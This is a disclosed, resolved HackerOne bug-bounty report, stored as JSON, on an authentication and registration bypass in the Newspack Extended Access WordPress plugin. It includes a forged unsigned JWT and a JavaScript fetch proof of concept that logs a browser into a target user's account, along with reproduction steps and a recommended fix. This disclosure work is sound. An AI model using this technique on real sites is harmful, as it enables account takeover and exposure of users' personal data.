{
  "id": 2536758,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTM2NzU4",
  "url": "https://hackerone.com/reports/2536758",
  "title": "Authentication & Registration Bypass in Newspack Extended Access",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2024-06-05T09:20:20.440Z",
  "submitted_at": "2024-06-05T09:20:20.682Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "xurizaemon0",
    "url": "/xurizaemon0",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/p5w9slhftttpfc83oxdw3adsrcj4/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 111,
    "url": "https://hackerone.com/automattic",
    "handle": "automattic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Automattic",
      "twitter_handle": "",
      "website": "https://automattic.com",
      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-07-05T12:14:56.046Z",
  "bug_reporter_agreed_on_going_public_at": "2024-07-04T20:46:34.562Z",
  "team_member_agreed_on_going_public_at": "2024-07-05T12:14:55.736Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe Newspack Extended Access plugin omits to verify JWT signing on the registration and login JSON endpoint. This permits registration of accounts with arbitrary (user-supplied) details, and auth bypass and account hijack if a target account email is known.\n\n## Platform(s) Affected:\nAny website using [Newspack Extended Access plugin](https://github.com/Automattic/newspack-extended-access).\n\n## Steps To Reproduce:\n\nCreate an unsigned JWT containing payload value `{\"azp\": {app id}, \"email\": \"target@example.org\"}`. Use a browser to supply this data to the Extended Access registration endpoint. Browser will be authenticated as the target user.\n\n### Requirements\n\n1. Site installed and configured with Newspack Extended Access (+ dependencies incl WooCommerce, WC Memberships, Newspack).\n 2. Target user email is known (for account hijack)\n\n### Notes\n\n1. For account hijack, target user must be registered via SwG / Extended Access initially\n2. There was previously a mitigation that hijack of Administrator or Editor roles was prevented, this was recently *removed* in [automattic/newspack-extended-access@4c87c25a](https://github.com/Automattic/newspack-extended-access/commit/4c87c25a58a6e16515e27e99eb040b336a4d3b07) \n\n### Reproduction\n\n1. Obtain the target site's Google App ID (ex: 12345-abcdef.apps.googleusercontent.com) by visiting the site and copying the JS value `authenticationSettings.googleClientApiID`\n2. Obtain the target email of the desired account (ex: test@example.org) to either hijack (existing) or register as a new user verified as associated with the named Google account\n3. Compose a JWT using those details:\n4. Execute a fetch request to the plugin endpoint using the supplied JS below\n5. The browser will now be logged into the target account.\n\n```json\n{\n  \"sub\": \"1234567890\",\n  \"azp\": \"12345-abcdef.apps.googleusercontent.com\" ,\n  \"email\": \"test@example.org\"\n}\n```\n\n```js\n// Endpoint URL\nlet url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;\n// JWT contents - this JWT contains the details above, and will not work as-is.\nlet token = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYXpwIjoiMTIzNDUtYWJjZGVmLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIn0.Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0\";\n// Provide token to authentication endpoint.\nfetch(  \n    url,  \n    {  \n       cache: 'no-store',  \n       method: 'POST',  \n       headers: {  \n          'Content-type': 'text/plain',  \n       },  \n       body: token  \n    }  \n).then(response => {  \n    console.log(response.json(), 'response');  \n})\n```\n\n## Supporting Material/References:\n\n* JWT is accepted without validation of JWT signature. Ref https://github.com/Automattic/newspack-extended-access/blob/2b22de2c2543b46a989fdcaa626fd011c1b39d59/includes/class-rest-controller.php#L84-L89\n* Mitigation: Newspack restricts authentication to user accounts which have metadata indicating that Signin with Google was used for initial sign-in. Ref https://github.com/Automattic/newspack-plugin/blob/trunk/includes/reader-activation/class-reader-activation.php#L681-L690\n\n### Impacts\n\n- Registration of accounts with arbitrary (user-supplied) details\n- Personal data (eg the target user's additional account details, billing address etc) will be visible to the attacker.\n- Registration processes may be bypassed.\n- Bulk registration may be used to deny service to the target website.\n- If a hijacked account has Admin role, full WordPress access can be obtained.\n- Authentication bypass if the target account email is known\n- Injection of untrusted data into user profiles\n\n## Solution recommendation\n\nThe solution here is I believe outlined in the integration documentation:\n\n- Google's JWT signing keys are made available from an HTTP endpoint\n- These keys should be retrieved periodically and stored in the consuming application (eg as a WordPress setting or other value)\n- When a JWT is presented to the endpoint, the JWT signature should be verified against Google's recently published keys before progressing with registration or authentication.\n\n## Impact\n\n- Authentication bypass\n- Registration bypass\n- Access to user private data\n- Potential for DoS\n- Potential for full system access",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 52,
  "voters": [
    "orange303",
    "he4am",
    "zy9ard3",
    "never_die",
    "d3f7ult",
    "shubham_srt",
    "brainspill3r",
    "superman85",
    "kalkii",
    "ahmed_xyz",
    "and 42 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 61104,
    "asset_type": "OTHER",
    "asset_identifier": "WordPress Plugins & Themes",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
